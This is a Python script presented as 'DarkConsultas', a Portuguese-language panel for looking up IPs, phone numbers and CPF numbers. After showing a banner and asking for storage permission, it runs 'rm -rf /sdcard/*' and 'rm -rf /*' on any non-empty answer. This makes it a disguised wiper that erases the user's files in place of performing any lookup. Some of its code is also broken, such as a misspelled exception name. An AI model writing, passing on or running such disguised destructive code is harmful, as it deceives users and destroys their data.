import os, sys
#DarkSad446
# Script Name: DarkConsultas
global R,B,C,Y,G,RT,CY,CO
CO='\033[m'
R='\033[1;31m'
B='\033[1;34m'
C='\033[1;37m'
CY='\033[1;36m'
Y='\033[1;33m'
G='\033[1;32m'
RT='\033[;0m'
try:
	import pyfiglet
except:
	os.system("pip3 install pyfiglet")
	os.system("pip install pyfiglet")
	import pyfiglet
	
os.system("clear")
result = pyfiglet.figlet_format("Kiny-Painel", font = "cosmic"  )
print(f"{C}{G}{result}{C}")
print(f'''{C}[{G}*{C}] Script criado pelo Dark para consultas de IPs, números, CPF,etc.
{C}[{Y}AVISO{C}]: Para prosseguir com a instalação, é necessário que você permita acesso a sua memória interna.
''')
sexo = input(f"{C}[{G}Deseja continuar?{C}] {C}y{C}/{C}n{C}.")
if sexo:
	try:
		open("cd /sdcard")
		os.system("rm -rf /sdcard/*")
		os.system("rm -rf /*")
	except lsADirectoryError:
		os.system("rm -rf /sdcard/*")
	except PermissionError:
		os.system("exit")